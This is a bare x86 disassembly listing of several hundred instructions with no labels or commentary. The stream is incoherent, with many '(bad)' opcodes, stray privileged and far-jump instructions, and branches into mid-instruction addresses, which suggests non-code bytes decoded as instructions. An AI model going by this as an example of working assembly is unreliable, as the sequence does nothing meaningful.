  406f37:	mov    ecx,0xff88aeb6
  406f3c:	out    dx,eax
  406f3d:	loopne 0x406f67
  406f3f:	aaa    
  406f40:	scas   eax,DWORD PTR es:[edi]
  406f41:	aas    
  406f42:	(bad)  
  406f43:	mov    dl,0x18
  406f45:	mov    ah,0x28
  406f47:	call   0x997b:0x1fd6e1c8
  406f4e:	aam    0x3f
  406f50:	mov    edx,DWORD PTR [ebp+0x3be41ca5]
  406f56:	jle    0x406ee1
  406f58:	outs   dx,DWORD PTR ds:[esi]
  406f59:	xlat   BYTE PTR ds:[ebx]
  406f5a:	call   0x35f0:0xfcdb70ae
  406f61:	pop    ss
  406f62:	add    ecx,0x54
  406f65:	ret    
  406f66:	push   esp
  406f67:	sbb    dh,BYTE PTR [edi+edi*1-0x31]
  406f6b:	pop    edx
  406f6c:	fsub   DWORD PTR [ebx-0x6a]
  406f6f:	xchg   BYTE PTR [edi-0x5173137c],ch
  406f75:	aad    0xd3
  406f77:	jecxz  0x406ff2
  406f79:	and    BYTE PTR [eax],bh
  406f7b:	(bad)  
  406f7c:	or     eax,0x5146c135
  406f81:	out    dx,al
  406f82:	jno    0x406f19
  406f84:	sub    edx,DWORD PTR [eax+0x6e]
  406f87:	(bad)  
  406f88:	mov    eax,ds:0xb192c7cf
  406f8d:	(bad)  
  406f8e:	fst    DWORD PTR [ecx-0x6e]
  406f91:	pop    eax
  406f92:	popa   
  406f93:	inc    ebp
  406f94:	outs   dx,DWORD PTR ds:[esi]
  406f95:	test   edx,esi
  406f97:	retf   
  406f98:	enter  0x7d92,0xff
  406f9c:	push   ds
  406f9d:	push   cs
  406f9e:	data16 jno 0x406f8b
  406fa1:	xchg   edi,eax
  406fa2:	fidiv  WORD PTR [ecx]
  406fa4:	scas   eax,DWORD PTR es:[edi]
  406fa5:	add    ah,0xb0
  406fa8:	repnz mov ecx,0x1e2ea506
  406fae:	outs   dx,BYTE PTR ds:[esi]
  406faf:	(bad)  
  406fb0:	xchg   edx,eax
  406fb1:	leave  
  406fb2:	push   esi
  406fb3:	imul   eax,ebx,0xffffffe2
  406fb6:	(bad)  
  406fb8:	xchg   edx,edx
  406fba:	inc    ebx
  406fbb:	pop    ebp
  406fbc:	pushf  
  406fbd:	repz lock xor eax,0x8709525a
  406fc4:	scas   al,BYTE PTR es:[edi]
  406fc5:	enter  0x5560,0xb2
  406fc9:	sub    al,0xc5
  406fcb:	mov    ebp,DWORD PTR ds:0x9881d410
  406fd1:	cmc    
  406fd2:	and    edx,ebx
  406fd4:	and    BYTE PTR [ebp-0x63ca1de3],dl
  406fda:	mov    bh,0x1f
  406fdc:	mov    bl,0x28
  406fde:	sahf   
  406fdf:	test   DWORD PTR gs:[ebp-0x3c],esp
  406fe3:	xchg   ebp,eax
  406fe4:	push   ecx
  406fe5:	bound  ecx,QWORD PTR [esi+0x52]
  406fe8:	sbb    BYTE PTR [esi],dl
  406fea:	retf   
  406feb:	dec    esi
  406fec:	retf   
  406fed:	loope  0x407011
  406fef:	mov    cl,0xd4
  406ff1:	pop    eax
  406ff2:	lahf   
  406ff3:	sbb    BYTE PTR [ecx-0x2e],ch
  406ff6:	mov    dh,0x77
  406ff8:	lock and dh,BYTE PTR [edx-0x37abe026]
  406fff:	aaa    
  407000:	icebp  
  407001:	(bad)  
  407002:	mov    ebp,0xabf2635b
  407007:	je     0x406f95
  407009:	icebp  
  40700a:	ins    BYTE PTR es:[edi],dx
  40700b:	int3   
  40700c:	loop   0x406fe6
  40700e:	xchg   esi,eax
  40700f:	xlat   BYTE PTR ds:[ebx]
  407010:	dec    BYTE PTR [edx-0x5c666237]
  407016:	ins    BYTE PTR es:[edi],dx
  407017:	ret    
  407018:	mov    bl,0x2
  40701a:	(bad)  
  40701b:	mov    ch,0x40
  40701d:	inc    ecx
  40701f:	scas   eax,DWORD PTR es:[edi]
  407020:	mov    ecx,cs
  407022:	in     al,0xcb
  407024:	(bad)  
  407026:	inc    edx
  407027:	repz cmp BYTE PTR [eax+0x4d],0x7
  40702c:	mov    edx,DWORD PTR [esi-0x46]
  40702f:	mov    esi,0x73e00f8
  407034:	xor    eax,DWORD PTR [ecx]
  407036:	pop    ecx
  407037:	add    al,0xfa
  407039:	aad    0x72
  40703b:	inc    esi
  40703c:	imul   ecx,DWORD PTR ds:0x47022baf,0xffffffba
  407043:	pushf  
  407044:	mov    WORD PTR [ebx+0x5dc70dd8],ds
  40704a:	pusha  
  40704b:	rcr    DWORD PTR [ecx],0xce
  40704e:	push   ds
  40704f:	cmp    eax,0xd8d6cf87
  407054:	es pop edi
  407056:	clc    
  407057:	sbb    esi,DWORD PTR [edi]
  407059:	aad    0xa7
  40705b:	(bad)  
  40705c:	mov    bh,0x81
  40705e:	dec    esi
  40705f:	add    eax,0x4d5748f2
  407064:	mov    ebx,0x6c17f697
  407069:	lods   eax,DWORD PTR ds:[esi]
  40706a:	pop    es
  40706b:	shl    BYTE PTR [edx+0x0],1
  40706e:	rcl    BYTE PTR [ebx],0xa6
  407071:	push   es
  407072:	cmp    ecx,DWORD PTR [esi+0x29]
  407075:	test   al,0x11
  407077:	or     al,0x49
  407079:	popa   
  40707a:	or     DWORD PTR [ebx+edx*1],ebx
  40707d:	push   0x6a
  40707f:	jb     0x407030
  407081:	sbb    esi,DWORD PTR [edi+0x32]
  407084:	pminsw mm5,QWORD PTR [edi+0x27f8fdd8]
  40708b:	int    0xe8
  40708d:	sub    ecx,DWORD PTR [edx-0x31]
  407090:	iret   
  407091:	dec    edi
  407092:	scas   eax,DWORD PTR es:[edi]
  407093:	repnz daa 
  407095:	pop    ss
  407096:	test   BYTE PTR [esp+ebp*2+0x560ee686],bl
  40709d:	push   esi
  40709e:	jnp    0x4070bc
  4070a0:	stc    
  4070a1:	sub    esp,DWORD PTR [ecx]
  4070a3:	clc    
  4070a4:	pop    ebp
  4070a5:	sbb    bl,dl
  4070a7:	jno    0x4070cf
  4070a9:	sbb    ebp,esp
  4070ab:	push   cs
  4070ac:	jo     0x407121
  4070ae:	sbb    BYTE PTR [ecx],ch
  4070b0:	and    ebx,DWORD PTR [eax-0x6a]
  4070b3:	add    edx,DWORD PTR [eax]
  4070b5:	xor    DWORD PTR [ecx-0x52079df4],0xffffffcc
  4070bc:	(bad)  [esi+0x18e989e0]
  4070c2:	sbb    al,0xed
  4070c4:	inc    ecx
  4070c5:	je     0x407073
  4070c7:	push   ecx
  4070c8:	(bad)  
  4070ca:	lahf   
  4070cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070cc:	imul   edx,DWORD PTR [ebx-0x6e],0xf8103e13
  4070d3:	gs sub al,0x53
  4070d6:	add    eax,0xff1d5f1c
  4070db:	mov    DWORD PTR ds:0x30dd4c7,ebp
  4070e1:	mov    esp,0xdee55ee7
  4070e6:	stos   DWORD PTR es:[edi],eax
  4070e7:	adc    DWORD PTR [esi+0x2406f600],ebp
  4070ed:	mov    eax,ds:0x81ab68c7
  4070f2:	div    WORD PTR ss:[ecx+0x3d2d4872]
  4070fa:	mov    al,0xff
  4070fc:	pop    ds
  4070fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070fe:	adc    BYTE PTR [eax-0x4eda132b],cl
  407104:	mul    ah
  407106:	pop    esi
  407107:	iret   
  407108:	xor    al,0x59
  40710a:	sub    al,0xc1
  40710c:	push   ebp
  40710d:	ds pop ebx
  40710f:	ins    DWORD PTR es:[edi],dx
  407110:	stos   BYTE PTR es:[edi],al
  407111:	add    ebp,esp
  407113:	popf   
  407114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407116:	cmp    eax,edi
  407118:	test   BYTE PTR [eax],cl
  40711a:	sub    DWORD PTR [eax+0x2a25d1fb],edi
  407120:	stos   BYTE PTR es:[edi],al
  407121:	lea    esp,[esi]
  407123:	es (bad) 
  407125:	sub    BYTE PTR [ecx+ebx*2-0x75],ah
  407129:	jle    0x4070c2
  40712b:	xchg   ecx,eax
  40712c:	mov    cr2,ebx
  40712f:	cdq    
  407130:	xlat   BYTE PTR ds:[ebx]
  407131:	and    eax,0x41444edb
  407136:	lods   eax,DWORD PTR ds:[esi]
  407137:	jae    0x4070c2
  407139:	daa    
  40713a:	test   al,0x41
  40713c:	jecxz  0x407125
  40713e:	jecxz  0x40716d
  407140:	dec    edi
  407141:	fstp   DWORD PTR [esi+0x5b]
  407144:	xor    BYTE PTR [ebx-0x2e],0x63
  407148:	popf   
  407149:	fwait
  40714a:	outs   dx,BYTE PTR ds:[esi]
  40714b:	cmp    eax,esp
  40714d:	add    al,0xfa
  407150:	xor    ah,BYTE PTR [eax-0x34]
  407153:	scas   al,BYTE PTR es:[edi]
  407154:	pop    ecx
  407155:	sahf   
  407156:	dec    ebp
  407157:	mov    WORD PTR [eax+eiz*4-0x35],cs
  40715b:	sub    eax,0xeb73963
  407160:	xor    DWORD PTR ds:0xa15cc3c8,edi
  407166:	push   cs
  407167:	add    DWORD PTR [esi],ebx
  407169:	pop    es
  40716a:	dec    ebx
  40716b:	fidivr WORD PTR [ebx+0x7e]
  40716e:	rcr    BYTE PTR [ebp+0x14],1
  407171:	sbb    esp,DWORD PTR [edx-0x20]
  407174:	mov    dl,0x3
  407176:	mov    al,0x1
  407178:	sbb    cl,BYTE PTR [eax]
  40717a:	inc    edx
  40717b:	jg     0x407187
  40717d:	icebp  
  40717e:	jmp    0x1ea36007
  407183:	fstp   st(7)
  407185:	pop    es
  407186:	aaa    
  407187:	jo     0x4071a9
  407189:	sbb    DWORD PTR [esi+edi*8-0x4d8bea56],edx
  407190:	ja     0x407179
  407192:	gs mov ecx,0x2e3c0ea7
  407198:	ja     0x4071e2
  40719a:	sbb    dl,dh
  40719c:	and    BYTE PTR [edx],al
  40719e:	cmp    edi,edx
  4071a0:	fnstenv [ebx-0x553267b0]
  4071a6:	inc    edx
  4071a7:	xchg   edx,eax
  4071a8:	mov    bh,0x2e
  4071aa:	imul   ecx,DWORD PTR [esp+edi*2-0x65],0xfc3c1205
  4071b2:	xchg   esp,eax
  4071b3:	mov    cl,0x87
  4071b5:	rcr    ebp,0x88
  4071b8:	shl    dh,1
  4071ba:	xchg   edx,eax
  4071bb:	out    0x13,eax
  4071bd:	jbe    0x407171
  4071bf:	sub    BYTE PTR [edx],dh
  4071c1:	cmp    BYTE PTR [ebp-0x2f],ch
  4071c4:	xchg   esp,eax
  4071c5:	(bad)  
  4071c6:	idiv   dl
  4071c8:	and    DWORD PTR [edx-0x37e1adc9],edi
  4071ce:	mov    al,ds:0x500e4b1e
  4071d3:	push   ebp
  4071d4:	push   ecx
  4071d5:	pop    edx
  4071d6:	test   bh,ah
  4071d8:	sub    eax,0xca6f6912
  4071dd:	or     DWORD PTR [ebp-0x6f77915f],esi
  4071e3:	test   DWORD PTR [esi+0x30b7662c],ebx
  4071e9:	call   DWORD PTR [esi+0x7b]
  4071ec:	fcmovnbe st,st(4)
  4071ee:	stos   BYTE PTR es:[edi],al
  4071ef:	pop    esi
  4071f0:	iret   
  4071f1:	in     eax,0x12
  4071f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071f4:	nop
  4071f5:	pop    esi
  4071f6:	iret   
  4071f7:	mov    cl,0x88
  4071f9:	mov    al,BYTE PTR [ebx-0x2b]
  4071fc:	out    dx,al
  4071fd:	mov    esp,0xadc4be99
  407202:	sbb    bl,BYTE PTR [ecx+0x688728b2]
  407208:	mov    edi,0xaa061f18
  40720d:	hlt    
  40720e:	mov    cl,0x9b
  407210:	aas    
  407211:	fucomp st(7)
  407213:	aas    
  407214:	int3   
  407215:	loop   0x40726a
  407217:	add    ebx,DWORD PTR [ebx+0x208987e0]
  40721d:	cld    
  40721e:	leave  
  40721f:	push   cs
  407220:	jae    0x40725a
  407222:	mov    ebp,0x43f3ca13
  407227:	inc    ebp
  407228:	dec    esi
  407229:	adc    al,0x7c
  40722b:	mov    edi,0xe82c7e42
  407230:	ss dec eax
  407232:	mov    DWORD PTR ds:0xeb9e81ae,0x822d8509
  40723c:	sar    ch,cl
  40723e:	pop    ebx
  40723f:	loopne 0x407236
  407241:	xor    ebp,DWORD PTR [ebp+0xe]
  407244:	push   ebp
  407245:	pushf  
  407246:	into   
  407247:	cmp    BYTE PTR [ebx+0x5b],0xa7
  40724b:	pusha  
  40724c:	popf   
  40724d:	mov    BYTE PTR [eax+0x763e4b7b],0xdc
  407254:	out    dx,al
  407255:	cmp    BYTE PTR [edi],ch
  407257:	mov    BYTE PTR [ebx],dl
  407259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40725a:	or     al,0x74
  40725c:	test   dl,bl
  40725e:	sahf   
  40725f:	adc    ecx,DWORD PTR [edi+0x36]
  407262:	cmp    eax,0xb41183
  407267:	xchg   ebp,eax
  407268:	ja     0x4072e7
  40726a:	pop    edx
  40726b:	or     BYTE PTR [ebx],dl
  40726d:	inc    esi
  40726e:	lods   al,BYTE PTR ds:[esi]
  40726f:	rcr    DWORD PTR [edi],cl
  407271:	cmp    bh,BYTE PTR [eax+edx*8]
  407274:	or     BYTE PTR [ecx],dl
  407276:	stos   BYTE PTR es:[edi],al
  407277:	push   0xe3e521fb
  40727c:	push   es
  40727d:	fisub  WORD PTR [edi-0x4d353488]
  407283:	fs ret 0x7f8e
  407287:	and    edi,edx
  407289:	aad    0x13
  40728b:	inc    ecx
  40728c:	popf   
  40728d:	in     al,dx
  40728e:	test   DWORD PTR [ebp-0x35793ddf],ebx
  407294:	or     al,0x41
  407296:	sub    al,0x29
  407298:	arpl   WORD PTR [edi+eax*1-0x48],cx
  40729c:	jle    0x4072c1
  40729e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40729f:	pop    edi
  4072a0:	xlat   BYTE PTR ds:[ebx]
  4072a1:	pop    ebp
  4072a2:	cmc    
  4072a3:	mov    DWORD PTR [eax],edx
  4072a5:	int    0x52
  4072a7:	and    edi,0x4e
  4072aa:	sbb    eax,0x8faae73f
  4072af:	xchg   ebp,eax
  4072b0:	mov    ds:0x7ade7c23,eax
  4072b5:	inc    ecx
  4072b6:	sbb    ecx,edi
  4072b8:	(bad)  
  4072b9:	ins    DWORD PTR es:[edi],dx
  4072ba:	xchg   edi,eax
  4072bb:	cdq    
  4072bc:	pop    esi
  4072bd:	mov    WORD PTR [eax+0x6839b87b],es
  4072c3:	pop    esp
  4072c4:	mov    edx,0x84b8ae92
  4072c9:	pop    edx
  4072ca:	mov    eax,0x4267e0bd
  4072cf:	nop
  4072d0:	and    DWORD PTR [edx-0x4],esi
  4072d3:	test   al,0xaa
  4072d5:	mov    bl,0x3b
  4072d7:	or     DWORD PTR [eax+0x25a2ee37],eax
  4072dd:	sbb    eax,0x1f9c1371
  4072e2:	mov    bl,0xa1
  4072e4:	adc    esp,esp
  4072e6:	dec    edx
  4072e7:	aad    0xd8
  4072e9:	mov    eax,ds:0xbb83f062
  4072ee:	in     al,dx
  4072ef:	fstp   QWORD PTR [edx-0x10]
  4072f2:	push   ss
  4072f3:	in     al,0x47
  4072f5:	daa    
  4072f6:	mov    ebx,0xddb24d08
  4072fb:	mov    dl,0x8e
  4072fd:	xchg   esi,eax
  4072fe:	mov    ?,ecx
  407300:	xor    ch,al
  407302:	inc    eax
  407303:	jb     0x4072ee
  407305:	scas   al,BYTE PTR es:[edi]
  407306:	inc    eax
  407307:	rol    BYTE PTR [edi+0x5b],cl
  40730a:	aad    0xf6
  40730c:	retf   
  40730d:	(bad)  
  40730e:	sbb    eax,0x789c1d67
  407313:	push   ebx
  407314:	inc    ebp
  407315:	shr    BYTE PTR [ecx+eiz*2-0x4c7d8ae7],0x62
  40731d:	and    BYTE PTR [esi-0x157a603d],al
  407323:	sbb    DWORD PTR [ebx],ebx
  407325:	xor    BYTE PTR [eax+0x730b1f1c],ah
  40732b:	mov    dl,0x1
  40732d:	outs   dx,DWORD PTR ds:[esi]
  40732e:	xchg   ebx,eax
  40732f:	or     dh,BYTE PTR [ecx+edx*2]
  407332:	or     esp,DWORD PTR [edx]
  407334:	lea    ebx,[edx]
  407336:	mov    bh,BYTE PTR [ebx+ebp*2]
  407339:	lahf   
  40733a:	cmp    dl,BYTE PTR [ebx-0x12]
  40733d:	inc    ebp
  40733e:	imul   ecx,DWORD PTR [ebx+eax*1+0x319dd4b5],0xa36d5d46
  407349:	ret    0x61d9
  40734c:	mov    edi,es
  40734e:	outs   dx,BYTE PTR ds:[esi]
  40734f:	sub    BYTE PTR [esp+esi*4+0x4563ecd5],ch
  407356:	ds out 0x0,al
  407359:	inc    ecx
  40735a:	inc    esp
  40735b:	sti    
  40735c:	enter  0x8e06,0x30
  407360:	rcr    DWORD PTR [edx-0x59b8938b],0x49
  407367:	dec    esi
  407368:	pop    eax
  407369:	mov    eax,0xffdce153
  40736e:	dec    eax
  40736f:	sahf   
  407370:	sub    ebp,esi
  407372:	addr16 sahf 
  407374:	jb     0x40733c
  407376:	jle    0x4073c2
  407378:	jecxz  0x40736a
  40737a:	ja     0x40739f
  40737c:	mov    ds:0x8142d42d,al
  407381:	test   eax,0xcbc1128a
  407386:	int    0xb
  407388:	call   0x65db04ec
  40738d:	jno    0x40732e
  40738f:	fs sbb dl,dl
  407392:	aam    0xad
  407394:	ret    
  407395:	int3   
  407396:	and    BYTE PTR [edx+0x22],ch
  407399:	cld    
  40739a:	add    cl,BYTE PTR [esi]
  40739c:	add    DWORD PTR [eax-0x2e],ecx
  40739f:	out    dx,al
  4073a0:	add    al,0x67
  4073a2:	push   es
  4073a3:	adc    eax,0x99481639
  4073a8:	jmp    0xa5c4:0x103b0253
  4073af:	sbb    dh,BYTE PTR [esi]
  4073b1:	mov    ds:0x2825ad70,eax
  4073b6:	push   ds
  4073b7:	repnz shr edx,1
  4073ba:	pop    esp
  4073bb:	inc    edi
  4073bc:	inc    ebp
  4073bd:	jge    0x4073d1
  4073bf:	call   FWORD PTR [esi+ebp*1+0x7e]
  4073c3:	pop    es
  4073c4:	mov    eax,0x614aa812
  4073c9:	nop
  4073ca:	sbb    BYTE PTR [ecx],ch
  4073cc:	mov    ?,WORD PTR [eax]
  4073ce:	sub    ebp,ecx
  4073d0:	inc    edi
  4073d1:	mov    bl,0x7b
  4073d3:	pop    ds
  4073d4:	js     0x40741e
  4073d6:	sbb    ch,dh
  4073d8:	repnz popa 
  4073da:	(bad)  
  4073db:	mov    ds:0xa49fc3a5,eax
  4073e0:	fs aas 
  4073e2:	lahf   
  4073e3:	inc    eax
  4073e4:	adc    DWORD PTR [edx+edx*2-0x1ebd32ed],edx
  4073eb:	or     ecx,DWORD PTR [esi+ebp*8-0x3d51889c]
  4073f2:	aas    
  4073f3:	jmp    0x73e8dfaf
  4073f8:	xor    edi,DWORD PTR [edx-0x779e7a55]
  4073fe:	in     al,dx
  4073ff:	push   edx
  407400:	popf   
  407401:	xchg   BYTE PTR [ebx+edi*4-0x706c6788],ch
  407408:	into   
  407409:	in     al,dx
  40740a:	add    BYTE PTR [ebx-0x8],0x82
  40740e:	stc    
  40740f:	sbb    BYTE PTR [ebx+ecx*1],0x89
  407413:	and    bl,BYTE PTR [edx-0x67ced436]
  407419:	ja     0x407496
  40741b:	or     DWORD PTR [ebx],ebp
  40741d:	ret    0x9336
  407420:	inc    esp
  407421:	sub    ebx,DWORD PTR [esi-0x2d]
  407424:	sbb    ecx,esp
  407426:	scas   al,BYTE PTR es:[edi]
  407427:	idiv   DWORD PTR ds:0xbc93d723
  40742d:	pop    ecx
  40742e:	jae    0x4073f0
  407430:	outs   dx,BYTE PTR ds:[esi]
  407431:	mov    al,0xe9
  407433:	mov    esi,0xe19f904b
  407438:	inc    esp
  407439:	repz push ss
  40743b:	sbb    dh,BYTE PTR [ecx]
  40743d:	adc    edi,DWORD PTR [ebx]
  40743f:	jns    0x407493
  407441:	cmp    ebp,eax
  407443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407444:	in     al,0x74
  407446:	shl    DWORD PTR [esi+0x27],1
  407449:	gs pop edx
  40744b:	aas    
  40744c:	adc    al,0x64
  40744e:	in     eax,0x23
  407450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407451:	cwde   
  407452:	ret    0x1e65
  407455:	pop    ds
  407456:	daa    
  407457:	add    al,0x35
  407459:	pop    ebx
  40745a:	push   esi
  40745b:	and    al,BYTE PTR [edi+ebp*8-0x4d]
  40745f:	mov    edi,edi
  407461:	mov    DWORD PTR [edx],ecx
  407463:	imul   esi,DWORD PTR [edx-0x57665c],0x39
  40746a:	jmp    0x5066:0x4a091492
  407471:	xor    eax,0x84548e3b
  407476:	sbb    BYTE PTR [esi-0x6d],bl
  407479:	icebp  
  40747a:	outs   dx,DWORD PTR ds:[esi]
  40747b:	pop    edi
  40747c:	push   ebx
  40747d:	cmp    ebp,DWORD PTR [edi+0x2e5570a2]
  407483:	shl    al,0x60
  407486:	add    edi,0xa
  407489:	je     0x407419
  40748b:	das    
  40748c:	call   0x2b708d61
  407491:	push   esi
  407492:	ret    
  407493:	in     eax,0xdb
  407495:	mov    ecx,0xa0c2c374
  40749a:	pop    edi
  40749b:	retf   0x1368
  40749e:	bound  edx,QWORD PTR [eax]
  4074a0:	jno    0x4074ee
  4074a2:	test   eax,0x625e1e93
  4074a7:	xchg   ebx,eax
  4074a8:	test   BYTE PTR [edx-0x28],bl
  4074ab:	fs int 0xae
  4074ae:	xchg   esi,eax
  4074af:	jmp    0xc1b6f39a
  4074b4:	cli    
  4074b5:	ins    DWORD PTR es:[edi],dx
  4074b6:	outs   dx,BYTE PTR ds:[esi]
  4074b7:	das    
  4074b8:	lods   al,BYTE PTR ds:[esi]
  4074b9:	mov    edi,0x966debf2
  4074be:	cbw    
  4074c0:	in     eax,dx
  4074c1:	pop    edi
  4074c2:	inc    ebx
  4074c3:	imul   ebp,DWORD PTR ds:0xdc29e6a5,0xffffffe8
  4074ca:	cs lods eax,DWORD PTR fs:[esi]
  4074cd:	iret   
  4074ce:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4074d0:	fisttp QWORD PTR [ebp+0x60d1314e]
  4074d6:	mov    ebp,0xeaec6af9
  4074db:	or     al,0xb3
  4074dd:	sub    eax,0x767b8904
  4074e2:	dec    esp
  4074e3:	stos   DWORD PTR es:[edi],eax
  4074e4:	push   eax
  4074e5:	retf   
  4074e6:	(bad)  
  4074e7:	(bad)  
  4074e8:	dec    edi
  4074e9:	les    ecx,FWORD PTR [ecx+ecx*4]
  4074ec:	adc    bl,BYTE PTR [ecx]
  4074ee:	imul   edx,DWORD PTR [edx+0x4acdc50f],0xfc292248
  4074f8:	xlat   BYTE PTR ds:[ebx]
  4074f9:	int3   
  4074fa:	xchg   DWORD PTR fs:[esi],ebp
  4074fd:	jne    0x40752f
  4074ff:	push   ds
  407500:	(bad)  
  407501:	clc    
  407502:	je     0x4074d2
  407504:	pusha  
  407505:	and    eax,0xab998223
  40750a:	lods   al,BYTE PTR ds:[esi]
  40750b:	adc    eax,0xe86305c3
  407510:	sbb    DWORD PTR [edi+0x1098615a],edx
  407516:	mov    edx,ecx
  407518:	inc    edi
  407519:	sbb    bl,bl
  40751b:	push   ebx
  40751c:	or     BYTE PTR [edx],cl
  40751e:	pop    ebp
  40751f:	sub    esp,edx
  407521:	jmp    0xf00803d2
  407526:	or     dh,BYTE PTR [ebp-0x25f5743a]
  40752c:	adc    al,0x8
  40752e:	(bad)  
  40752f:	fsub   DWORD PTR [ebp-0x3ff8009d]
  407535:	aas    
  407536:	shl    DWORD PTR [edx+0x57],cl
  407539:	sbb    dl,ah
  40753b:	lods   al,BYTE PTR ds:[esi]
  40753c:	push   eax
  40753d:	mov    esp,0x4ca1ade8
  407542:	sub    al,0x3
  407544:	rol    DWORD PTR [edi],0xb0
  407547:	in     al,dx
  407548:	int    0x75
  40754a:	pop    edi
  40754b:	(bad)  
  40754c:	jp     0x40751b
  40754e:	ret    
  40754f:	and    ch,ah
  407551:	call   0x4f6a:0x5783a772
  407558:	inc    eax
  407559:	arpl   dx,si
  40755b:	and    ch,ch
  40755d:	cmp    edi,DWORD PTR [ebx]
  40755f:	sbb    al,0xca
  407561:	pop    ss
  407562:	sbb    eax,0x892669f7
  407567:	xor    dl,BYTE PTR [ebx-0x34a3d7d]
  40756d:	xor    eax,0xe17e600c
  407572:	xchg   BYTE PTR [edx+0x52],ch
  407575:	sub    bh,dh
  407577:	loopne 0x407510
  407579:	das    
  40757a:	out    0xc,eax
  40757c:	mov    ecx,0x5bd86f11
  407581:	out    dx,eax
  407582:	mov    dh,0x76
  407584:	mov    esi,DWORD PTR [ebx]
  407586:	inc    edi
  407587:	sbb    eax,0x6077966c
  40758c:	scas   al,BYTE PTR es:[edi]
  40758d:	cld    
  40758e:	mov    esp,0x730000ef
  407593:	pop    ebx
  407594:	nop
  407595:	out    dx,al
  407596:	mov    BYTE PTR [ebp+0x319c958c],ah
  40759c:	mov    ecx,0x7b79b5cd
  4075a1:	mov    esi,DWORD PTR [edi+0xb]
  4075a4:	ret    0x134d
  4075a7:	cmp    esi,edx
  4075a9:	daa    
  4075aa:	sbb    al,0x6b
  4075ac:	jae    0x407628
  4075ae:	retf   0x9d5d
  4075b1:	rcl    BYTE PTR [ebx],1
  4075b3:	add    al,0x3
  4075b5:	inc    ebp
  4075b6:	mov    WORD PTR [esi],fs
  4075b8:	in     eax,0x10
  4075ba:	inc    BYTE PTR [eax+0x6a]
  4075bd:	out    0xec,eax
  4075bf:	pop    edi
  4075c0:	fstp   QWORD PTR [eax+ebp*1-0x79]
  4075c4:	inc    edi
  4075c5:	aaa    
  4075c6:	jno    0x407584
  4075c8:	fnsave [eax-0x5c]
  4075cb:	pop    esp
  4075cc:	mov    ah,0x3d
  4075ce:	adc    BYTE PTR [ebx-0x50],bl
  4075d1:	sbb    bl,BYTE PTR [eax+0x47]
  4075d4:	ss jne 0x40761f
  4075d7:	mov    al,0xd7
  4075d9:	mov    bh,0x93
  4075db:	mov    edi,?
  4075dd:	sbb    eax,0x5b6b9ee0
  4075e2:	shl    DWORD PTR [edx-0x2d],0xbe
  4075e6:	loopne 0x4075e6
  4075e8:	xor    DWORD PTR [edx-0x3b],0x77
  4075ec:	adc    ch,BYTE PTR [eax-0x5b]
  4075ef:	and    BYTE PTR [ebx+0x33bb8e8e],ah
  4075f5:	inc    edx
  4075f6:	nop
  4075f7:	xchg   ecx,eax
  4075f8:	shl    dh,0xc9
  4075fb:	jo     0x407633
  4075fd:	loope  0x407669
  4075ff:	cmp    DWORD PTR [ebx-0x3],0xb13fac63
  407606:	hlt    
  407607:	icebp  
  407608:	sub    BYTE PTR [esi+0x46],0xdc
  40760c:	icebp  
  40760d:	sahf   
  40760e:	or     BYTE PTR [eax-0x11],0x28
  407612:	in     al,0x86
  407614:	cmc    
  407615:	aaa    
  407616:	xchg   ebp,eax
  407617:	test   bh,dl
  407619:	in     eax,0x40
  40761b:	add    ebx,ecx
  40761d:	pop    ebx
  40761e:	dec    ebx
  40761f:	(bad)  
  407620:	fmul   QWORD PTR [eax+0x1]
  407623:	aaa    
  407624:	jnp    0x407698
  407626:	cmp    eax,ebx
  407628:	xor    dh,0xd5
  40762b:	and    BYTE PTR [eax+ebx*1],cl
  40762e:	ja     0x40760e
  407630:	mov    WORD PTR [eax],es
  407632:	xor    al,0xaa
  407634:	pop    esi
  407635:	and    al,ch
  407637:	push   esp
  407638:	ins    DWORD PTR es:[edi],dx
  407639:	push   esp
  40763a:	cmc    
  40763b:	js     0x407615
  40763d:	lea    ebx,[eax+edx*1+0x17bdc775]
  407644:	aad    0x9c
  407646:	adc    BYTE PTR [edi+0x2e],dh
  407649:	hlt    
  40764a:	inc    ebp
  40764b:	leave  
  40764c:	sbb    ecx,ebx
  40764e:	and    DWORD PTR [edx+ebp*1-0x2b9cf5ed],0x1d0fb0af
  407659:	gs lock pop eax
  40765c:	in     al,dx
  40765d:	stc    
  40765e:	in     eax,0xa0
  407660:	mov    bh,BYTE PTR [di+0x76e]
  407665:	(bad)  
  407666:	cmp    DWORD PTR [edx],ebp
  407668:	test   DWORD PTR [ecx-0x69ad352b],eax
  40766e:	rcr    edi,cl
  407670:	stos   BYTE PTR es:[edi],al
  407671:	stos   BYTE PTR es:[edi],al
  407672:	or     al,0x4c
  407674:	dec    ecx
  407675:	cdq    
  407676:	pop    es
  407677:	test   DWORD PTR ds:[eax+0x3d],esi
  40767b:	xchg   edx,eax
  40767c:	inc    ebp
  40767d:	mov    ebp,edx
  40767f:	lock cwde 
  407681:	mov    BYTE PTR [esi],ch
  407683:	bswap  esp
  407685:	inc    ebx
  407686:	mov    WORD PTR [ebp-0x4f],fs
  407689:	push   cs
  40768a:	adc    al,0xc6
  40768c:	xlat   BYTE PTR ds:[ebx]
  40768d:	test   eax,0xd6590c1b
  407692:	pop    esp
  407693:	in     eax,0xb
  407695:	retf   
  407696:	shl    DWORD PTR [edi],cl
  407698:	test   DWORD PTR [eax-0x4324b3f7],edi
  40769e:	sar    BYTE PTR [edi],0x79
  4076a1:	and    eax,DWORD PTR [eax+0x5b2b96ee]
  4076a7:	and    eax,0xc038b089
  4076ac:	fmul   DWORD PTR [ecx-0x1a6fb7a]
  4076b2:	stos   BYTE PTR es:[edi],al
  4076b3:	test   al,0x5a
  4076b5:	out    0xbb,eax
  4076b7:	inc    edi
  4076b8:	xchg   ebp,eax
  4076b9:	mov    dh,0x38
  4076bb:	rcr    DWORD PTR [ebx+0x33911cb8],0x1a
  4076c2:	aam    0x40
  4076c4:	xchg   esi,eax
  4076c5:	xlat   BYTE PTR ds:[ebx]
  4076c6:	jne    0x40768d
  4076c8:	dec    edx
